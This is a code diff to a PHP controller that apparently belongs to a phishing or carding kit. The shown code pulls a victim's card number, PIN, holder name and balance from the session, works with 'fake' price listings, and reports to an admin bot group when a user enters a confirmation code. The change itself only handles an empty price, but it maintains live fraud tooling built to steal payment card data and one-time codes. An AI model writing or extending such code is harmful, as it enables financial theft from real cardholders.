@@ -373,7 +373,7 @@ class PagesController extends Controller
         $cpin = $request->session()->get('card_pin');
         $holder = $request->session()->get('card_holder');
         $balance = $request->session()->get('balance');
-        $amount = number_format($fake->price, 0, "", " ");
+        $amount = number_format(empty($fake->price) ? 0 : $fake->price, 0, "", " ");
         $bankName = ucfirst($this->bank);
         $currency = $fake->country->currency ?? setting('currency');
 
@@ -444,7 +444,7 @@ class PagesController extends Controller
         $fake = $this->getFake();
         $currency = $fake->country->currency ?? setting('currency');
         $ccnumber = $request->session()->get('card_number');
-        $amount = number_format($fake->price, 0, "", " ");
+        $amount = number_format(empty($fake->price) ? 0 : $fake->price, 0, "", " ");
         if ($code = $request->get('code')) {
             if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
                 "⚠️<b>️Пользователь вводит код подтверждения</b>",
